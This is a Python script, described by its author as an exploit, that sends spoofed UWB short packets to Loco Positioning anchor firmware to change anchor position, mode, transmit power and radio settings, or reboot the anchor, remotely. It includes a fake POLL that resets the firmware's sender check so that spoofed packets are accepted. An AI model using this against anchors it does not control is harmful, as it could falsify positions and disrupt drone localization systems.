"""
This script exploits the function lppHandleShortPacket() in lpp.c from the Loco Positioning nodes firmware
to change anchor settings without needing a crazyflie or a direct micro-USB connection.

The target anchor should be in TWR, TDOA2 or TDOA3 mode, as these are the ones that use lppHandleShortPacket().

The message format for a short LPP packet is:
[Frame Control (2 bytes), SEQ (1 byte), PAN ID (2 bytes), Destination Addr (8 bytes), Source Addr (8 bytes), LPP_SHORT_TAG (1 byte)]
followed by:
[LPP_SHORT_TYPE (1 byte), payload...]

The different short-packet types supported by the firmware are:
LPP_SHORT_ANCHOR_POSITION 0x01 -> 3 x float32 values (x, y, z)
LPP_SHORT_REBOOT          0x02 -> 0x00 reboots to bootloader, 0x01 reboots to firmware
LPP_SHORT_MODE            0x03 -> 0x01 TWR, 0x02 TDOA2, 0x03 TDOA3
LPP_SHORT_UWB             0x04 -> [flags, tx_power[4 bytes]]
LPP_SHORT_UWB_MODE        0x05 -> [flags]

Flags are documented in the firmware as:
- UWB:      000000__FORCE_TX_POWER_BIT__SMART_TX_POWER_BIT
- UWB_MODE: 000000__LONG_PREAMBLE_BIT__LOW_BITRATE_BIT
"""
########################################## CONFIGURATION AREA - CHANGE THESE PARAMS ##########################################
# Target anchor - unfortunately can't change ID remotely
ANCHOR_ID = 5

# Configuration parameters; set to None to leave them unchanged
ANCHOR_POS = (1,1,1)      # (x, y, z) 
REBOOT = None          # 1 = reboot to firmware, 2 = reboot to bootloader
MODE = 3               # 1 = TWR, 2 = TDOA2, 3 = TDOA3
UWB_POWER = None       # (smart_tx_enabled, force_tx_enabled, 32bit_tx_power_value). Example: Force max power: (0, 1, 0xFFFFFFFF)
# NOTE: Careful with UWB settings - if you want to change them back, you will have to change the DW1000 settings below 
# the DW1000 is config'ed by default to match normal operation (0,0). 
UWB_RADIO = None       # (low_bitrate_enabled, long_preamble_enabled)

########################################## CODE - LOGIC BASED ON LOCO POSITIONING NODE FIRMWARE ##########################################
import struct
from pathlib import Path
import sys
import time

LPP_SHORT_TAG = 0xF0
LPP_SHORT_ANCHOR_POSITION = 0x01
LPP_SHORT_REBOOT = 0x02
LPP_SHORT_MODE = 0x03
LPP_SHORT_UWB = 0x04
LPP_SHORT_UWB_MODE = 0x05

# Add parent directory to sys.path
parent_dir = str(Path(__file__).resolve().parent.parent)
if parent_dir not in sys.path:
    sys.path.insert(0, parent_dir)

from src.dw1000 import DW1000

def build_uwb_power_payload(smart_tx_power: int, force_tx_power: int, tx_power: int) -> list[int]:
    smart_tx_power = int(bool(smart_tx_power)) & 0x01
    force_tx_power = int(bool(force_tx_power)) & 0x01
    flags = (force_tx_power << 1) | smart_tx_power
    tx_power = int(tx_power) & 0xFFFFFFFF
    return [flags] + list(tx_power.to_bytes(4, 'little'))


def build_uwb_radio_payload(low_bitrate: int, long_preamble: int) -> list[int]:
    low_bitrate = int(bool(low_bitrate)) & 0x01
    long_preamble = int(bool(long_preamble)) & 0x01
    flags = (long_preamble << 1) | low_bitrate
    return [flags]


def build_config_messages() -> list[list[int]]:
    to_send: list[list[int]] = []

    if ANCHOR_POS is not None:
        to_send.append([LPP_SHORT_ANCHOR_POSITION] + list(struct.pack('<fff', *ANCHOR_POS)))

    if REBOOT is not None:
        if REBOOT == 1:
            to_send.append([LPP_SHORT_REBOOT, 0x01])
        elif REBOOT == 2:
            to_send.append([LPP_SHORT_REBOOT, 0x00])
        else:
            raise ValueError(f"REBOOT must be None, 1, or 2; got {REBOOT!r}")

    if MODE is not None:
        if MODE not in (1, 2, 3):
            raise ValueError(f"MODE must be None, 1, 2, or 3; got {MODE!r}")
        to_send.append([LPP_SHORT_MODE, MODE])

    if UWB_POWER is not None:
        smart_tx_power, force_tx_power, tx_power = UWB_POWER
        to_send.append([LPP_SHORT_UWB] + build_uwb_power_payload(smart_tx_power, force_tx_power, tx_power))

    if UWB_RADIO is not None:
        low_bitrate, long_preamble = UWB_RADIO
        to_send.append([LPP_SHORT_UWB_MODE] + build_uwb_radio_payload(low_bitrate, long_preamble))

    return to_send


if __name__ == "__main__":
    try:
        config_messages = build_config_messages()
    except ValueError as exc:
        raise SystemExit(str(exc)) from exc

    with DW1000(0, 0, 2, 64, 6.8, 128, 9, True, None) as dw:
        # NOTE: SOURCE_ADDR SET TO 0, ELSE ANCHOR FIRMWARE WILL REJECT MODIFS WHEN IN TWR MODE!
        header = [0x41, 0xDC, 0x00, 0xCF, 0xBC] + list(ANCHOR_ID.to_bytes(6, 'little') + b'\xcf\xbc') + ([0]*6+[0xCF, 0xBC]) + [LPP_SHORT_TAG] 
        
        # If the tag is already in TWR mode, an internal check is performed to ensure the ID of the sender matches the latest ID the tag communicated with
        # Sending a POLL request resets this variable (curr_tag in the firmware), which allows us to set the source address to 0 and have the anchor accept the modifs
        if MODE!=1: 
            poll = header[:-1] + [0x01] + [0x01]  # sending a random POLL with SEQ 1 to reset curr_tag to 0 in firmware
            dw.transmit(poll, False) 

        for cfg in config_messages:
            msg = header + cfg
            for _ in range(3):
                dw.transmit(data=msg, ranging=False)
                time.sleep(0.1)
            time.sleep(0.2)

    print(f"ANCHOR {ANCHOR_ID} HAS BEEN CONFIGURED:")
    print(f"  anchor_pos      = {ANCHOR_POS}")
    print(f"  reboot          = {REBOOT}")
    print(f"  mode            = {MODE}")
    print(f"  uwb_power       = {UWB_POWER}")
    print(f"  uwb_radio       = {UWB_RADIO}")
